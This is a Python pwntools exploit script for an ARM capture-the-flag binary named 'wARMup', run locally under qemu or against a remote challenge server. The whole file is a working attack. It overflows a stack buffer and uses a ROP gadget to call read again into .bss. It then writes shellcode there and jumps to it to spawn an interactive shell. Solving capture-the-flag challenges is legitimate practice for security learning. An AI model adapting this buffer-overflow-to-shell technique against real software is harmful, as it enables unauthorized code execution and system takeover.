from pwn import *
import sys
context.binary = "./wARMup"
context.log_level = "debug"

if sys.argv[1] == "r":
    p = remote("node3.buuoj.cn", 26688)
elif sys.argv[1] == "l":
    p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./wARMup"])
else:
    p = process(["qemu-arm", "-g", "1234", "-L", "/usr/arm-linux-gnueabihf", "./wARMup"])

elf = ELF("./wARMup")
libc = ELF("/usr/arm-linux-gnueabihf/lib/libc.so.6")

padding = 100#104
pop_r3_pc = 0x00010364
main_read = 0x00010530

# payload = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"
payload = padding*'a'+p32(elf.bss()+0x100)
payload += p32(pop_r3_pc)+p32(elf.bss()+0x100)+p32(main_read)
shellcode = asm(shellcraft.sh())

p.recvuntil("!\n")
p.send(payload)
sleep(0.5)
p.send(p32(elf.bss()+0x100+0x4)+shellcode)


p.interactive()